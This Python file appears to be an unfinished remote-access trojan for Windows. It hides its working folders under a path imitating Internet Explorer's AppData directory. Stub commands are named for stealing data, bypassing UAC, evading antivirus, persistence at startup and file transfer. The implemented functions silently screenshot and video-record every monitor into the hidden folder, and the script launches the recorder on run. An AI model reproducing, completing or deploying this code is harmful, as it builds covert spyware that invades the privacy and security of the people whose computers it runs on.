import os, sys
from PIL import ImageGrab
import screeninfo
import mss
import cv2
import time
from threading import Thread
import numpy as np
import threading


Thisfile = sys.argv[0]  # Full file path with name and file format
Thisfile_name = os.path.basename(Thisfile)  # File name without path
user_path = os.path.expanduser('~')  # Fath to user folder
ultiDevPath = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Internet Explorer"   # Change folder name if needed
folders = ['Startup', 'Data', 'RemoteDesktop', 'bat']

os.makedirs(ultiDevPath, exist_ok=True)

for folder in folders:
    folder_path = os.path.join(ultiDevPath, folder)
    globals()[f"{folder}Path"] = folder_path  # Adds a variable for every folder by adding "Path" to folder name, e.g. "RemoteDesktopPath" or "batPath"

def ping(device_name):
    pass
def locate(device_name, parameter):
    pass
def taskmgr(device_name, parameter):
    pass
def uac(device_name, parameter):
    pass
def regedit(device_name, parameter):
    pass
def explorer(device_name, parameter):
    pass
def conpan(device_name, parameter):
    pass
def blockurl(device_name, parameter):
    pass
def unblockurl(device_name, parameter):
    pass
def opensite(device_name, parameter):
    pass
def blockprcss(device_name, parameter):
    pass
def video(device_name, parameter):
    pass
def audio(device_name, parameter):
    pass
def wbcmimg(device_name, parameter):
    pass
def scrnsht(device_name, parameter):

    with mss.mss() as sct:
        monitors = sct.monitors
        monitor_count = len(monitors) - 1

        print(f"Detected {monitor_count} monitor(s).")

        for index, monitor in enumerate(monitors[1:], start=1):  # Skip monitor[0]

            screenshot = sct.grab(monitor)

            screenshot_path = os.path.join(DataPath, f'screenshot_monitor_{index}.png')
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_path)
            print(f"Screenshot saved for Monitor {index}: {screenshot_path}")

    try:
        for index in range(monitor_count):
            pass
            #os.remove(os.path.join(DataPath, f'screenshot_monitor_{index + 1}.jpg'))
    except Exception as e:
        print(f"Error during cleanup: {e}")


def scrnrcd(device_name, parameter):
    def record_monitor(monitor, monitor_index, duration=10):
        """
        Record video for a specific monitor and adjust the FPS for playback.

        Args:
            monitor (dict): Monitor dimensions from mss.
            monitor_index (int): Index of the monitor being recorded.
            duration (int): Duration of the recording in seconds.
        """
        video_path = os.path.join(DataPath, f"monitor_{monitor_index}.mp4")
        print(f"Recording Monitor {monitor_index} to {video_path}")

        # Define video codec for output file
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Use 'mp4v' codec for .mp4 files
        width, height = monitor["width"], monitor["height"]

        # Frame capture settings
        frame_times = []  # To store times for calculating actual FPS
        frames = []  # To store captured frames for post-processing
        with mss.mss() as sct:
            for _ in range(duration * 20):  # Capture frames at 20 FPS (fixed rate)
                start_time = time.time()

                # Capture screen
                screenshot = sct.grab(monitor)

                # Convert the screenshot to a numpy array and BGR format
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                # Store the frame and capture time for later FPS adjustment
                frames.append(frame)
                frame_times.append(time.time() - start_time)

                # Regulate frame capture speed
                elapsed_time = time.time() - start_time
                sleep_time = max(0, (1 / 20) - elapsed_time)  # target FPS is 20
                time.sleep(sleep_time)

        # Calculate actual FPS based on time intervals between frame captures
        actual_fps = 1 / (sum(frame_times) / len(frame_times))
        print(f"Finished recording Monitor {monitor_index}: {video_path} (Actual FPS: {actual_fps:.2f})")

        # Write the frames with the actual FPS
        out = cv2.VideoWriter(video_path, fourcc, actual_fps, (width, height))

        for frame in frames:
            out.write(frame)

        out.release()
        print(f"Video saved to {video_path}")

    # Get monitor information and start recording
    with mss.mss() as sct:
        monitors = sct.monitors[1:]  # Exclude the full virtual screen (monitors[0])

        print(f"Detected {len(monitors)} monitor(s). Starting recording...")

        # Create a thread for each monitor
        threads = []
        for index, monitor in enumerate(monitors, start=1):
            thread = Thread(target=record_monitor, args=(monitor, index))
            threads.append(thread)
            thread.start()

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

    print("All recordings finished.")


def antivrs(device_name, parameter):
    pass
def pcinfo(device_name, parameter):
    pass
def steal(device_name, parameter):
    pass
def onchat(device_name, parameter):
    pass
def remoteplay(device_name, parameter):
    pass
def dir(device_name, parameter):
    pass
def updatecode(device_name, parameter):
    pass
def startup(device_name, parameter):
    pass
def sendfile(device_name, parameter):
    pass
def getfile(device_name, parameter):
    pass
def help(device_name, parameter):
    pass

scrnrcd(1, 1)